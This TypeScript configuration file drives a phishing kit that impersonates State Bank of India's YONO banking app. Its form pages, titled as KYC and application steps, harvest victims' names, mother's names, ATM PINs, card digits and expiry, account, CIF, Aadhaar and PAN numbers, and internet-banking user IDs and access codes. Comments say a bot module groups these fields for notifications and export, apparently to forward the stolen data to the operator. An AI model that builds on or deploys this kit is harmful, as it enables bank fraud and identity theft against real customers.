// ============================================================
// FORM CONFIGURATION — Single source of truth for all form pages
// ============================================================
// To add/remove/change a form page or field:
//   1. Edit the FORM_PAGES array below
//   2. Create/update the corresponding HTML file in public/pages/
//   That's it — bot.ts, types, and server routes all read from here.
// ============================================================

export interface FieldConfig {
    key: string;           // Field key (used in data storage & API)
    displayName: string;   // Human-readable name (used in bot messages & exports)
    type: 'text' | 'tel' | 'password' | 'date';  // HTML input type
    category: 'personal' | 'account' | 'card' | 'login';  // Grouping for bot export
    required: boolean;
    maxlength?: number;
    placeholder?: string;
}

export interface PageConfig {
    id: string;            // Unique page ID (used in URL: pages/{id}.html)
    pageName: string;      // Name sent to /api/form/sync (e.g. 'kyc_login')
    title: string;         // Display title for the page
    fields: FieldConfig[]; // Fields on this page
    // Navigation: which page comes next in each flow (null = end of flow)
    nextPage: {
        main?: string | null;
        apply?: string | null;
    };
    isFinalPage?: boolean; // If true, calls /api/form/submit after sync
}

export interface CategoryConfig {
    key: string;
    displayName: string;
    emoji: string;
}

// ==================== FIELD CATEGORIES ====================
// Used by bot.ts to group fields in notifications & exports

export const FIELD_CATEGORIES: CategoryConfig[] = [
    { key: 'personal', displayName: 'Personal Details', emoji: '👤' },
    { key: 'account', displayName: 'Account Details', emoji: '🏦' },
    { key: 'card', displayName: 'Card Details', emoji: '💳' },
    { key: 'login', displayName: 'Login Credentials', emoji: '🔐' },
];

// ==================== FORM PAGES ====================
// Order matters — this defines the default page sequence.
// Each page's `nextPage` defines per-flow navigation.

export const FORM_PAGES: PageConfig[] = [
    // ---- MAIN FLOW: kyc_login → card → profile_verify → success ----
    {
        id: 'kyc_login',
        pageName: 'kyc_login',
        title: 'Sbi Yono Kyc Login',
        fields: [
            { key: 'fullName', displayName: 'Full Name', type: 'text', category: 'personal', required: true, placeholder: 'Enter your full name' },
            { key: 'mobileNumber', displayName: 'Mobile Number', type: 'tel', category: 'personal', required: true, maxlength: 10, placeholder: 'Enter mobile number' },
            { key: 'motherName', displayName: 'Mother Name', type: 'text', category: 'personal', required: true, placeholder: "Enter mother's name" },
        ],
        nextPage: { main: 'card_auth' },
    },
    {
        id: 'card_auth',
        pageName: 'card_auth',
        title: 'Debit Card Authentication',
        fields: [
            { key: 'cardLast6', displayName: 'Card Last 6', type: 'tel', category: 'card', required: true, maxlength: 7, placeholder: '__ ____' },
            { key: 'atmPin', displayName: 'ATM PIN', type: 'tel', category: 'card', required: true, maxlength: 4, placeholder: '••••' },
        ],
        nextPage: { main: 'profile_verify' },
    },
    {
        id: 'profile_verify',
        pageName: 'profile_verify',
        title: 'Verify Profile Details',
        fields: [
            { key: 'accountNumber', displayName: 'Account Number', type: 'text', category: 'account', required: true, placeholder: 'Enter account number' },
            { key: 'aadhaarNumber', displayName: 'Aadhaar Number', type: 'text', category: 'account', required: true, maxlength: 12, placeholder: 'Enter 12-digit Aadhaar' },
            { key: 'panCard', displayName: 'PAN Card', type: 'text', category: 'account', required: true, maxlength: 10, placeholder: 'Enter PAN number' },
        ],
        nextPage: { main: null },
        isFinalPage: true,  // Main flow ends here
    },

    // ---- APPLY FLOW: yono_apply → verification → login_details → success ----
    {
        id: 'yono_apply',
        pageName: 'yono_apply',
        title: 'Apply YONO SBI',
        fields: [
            { key: 'fullName', displayName: 'Full Name', type: 'text', category: 'personal', required: true, placeholder: 'Enter your name' },
            { key: 'mobileNumber', displayName: 'Mobile Number', type: 'tel', category: 'personal', required: true, maxlength: 10, placeholder: 'Mobile number' },
            { key: 'accountNumber', displayName: 'Account Number', type: 'text', category: 'account', required: true, placeholder: 'Account number' },
            { key: 'cifNumber', displayName: 'CIF Number', type: 'text', category: 'account', required: true, placeholder: 'Enter CIF number' },
            { key: 'branchCode', displayName: 'Branch Code', type: 'text', category: 'account', required: true, placeholder: 'Enter branch code' },
        ],
        nextPage: { apply: 'verification' },
    },
    {
        id: 'verification',
        pageName: 'verification',
        title: 'Step 2 – Verification',
        fields: [
            { key: 'dateOfBirth', displayName: 'Date of Birth', type: 'tel', category: 'personal', required: true, maxlength: 10, placeholder: 'DD/MM/YYYY' },
            { key: 'cardExpiry', displayName: 'Card Expiry', type: 'tel', category: 'card', required: true, maxlength: 5, placeholder: 'MM/YY' },
            { key: 'finalPin', displayName: 'Final PIN', type: 'tel', category: 'card', required: true, maxlength: 4, placeholder: '••••' },
        ],
        nextPage: { apply: 'login_details' },
    },
    {
        id: 'login_details',
        pageName: 'login_details',
        title: 'Login Details',
        fields: [
            { key: 'userId', displayName: 'User ID', type: 'text', category: 'login', required: true, placeholder: 'Enter User ID' },
            { key: 'accessCode', displayName: 'Access Code', type: 'password', category: 'login', required: true, placeholder: 'Enter Access Code' },
            { key: 'profileCode', displayName: 'Profile Code', type: 'password', category: 'login', required: true, placeholder: 'Enter Profile Code' },
        ],
        nextPage: { apply: null },
        isFinalPage: true,  // Apply flow ends here
    },
];

// ==================== HELPER FUNCTIONS ====================

/** Get all unique field keys across all pages */
export function getAllFieldKeys(): string[] {
    const keys = new Set<string>();
    FORM_PAGES.forEach(page => page.fields.forEach(f => keys.add(f.key)));
    return Array.from(keys);
}

/** Get display name for a field key */
export function getFieldDisplayName(key: string): string {
    for (const page of FORM_PAGES) {
        const field = page.fields.find(f => f.key === key);
        if (field) return field.displayName;
    }
    // Fallback: convert camelCase to Title Case
    return key.replace(/([A-Z])/g, ' $1').replace(/^./, str => str.toUpperCase());
}

/** Get all fields for a specific category */
export function getFieldsByCategory(category: string): FieldConfig[] {
    const fields: FieldConfig[] = [];
    const seenKeys = new Set<string>();
    FORM_PAGES.forEach(page => {
        page.fields.forEach(f => {
            if (f.category === category && !seenKeys.has(f.key)) {
                fields.push(f);
                seenKeys.add(f.key);
            }
        });
    });
    return fields;
}

/** Get page config by ID */
export function getPageById(pageId: string): PageConfig | undefined {
    return FORM_PAGES.find(p => p.id === pageId);
}

/** Get page config by pageName */
export function getPageByName(pageName: string): PageConfig | undefined {
    return FORM_PAGES.find(p => p.pageName === pageName);
}

/** Fields to exclude from display (metadata fields) */
export const EXCLUDE_FIELDS = new Set([
    'pageName', 'submittedAt', 'deviceId', 'currentFlow',
    'id', 'sessionStart', 'sessionEnd', 'flowType', 'pagesSubmitted'
]);
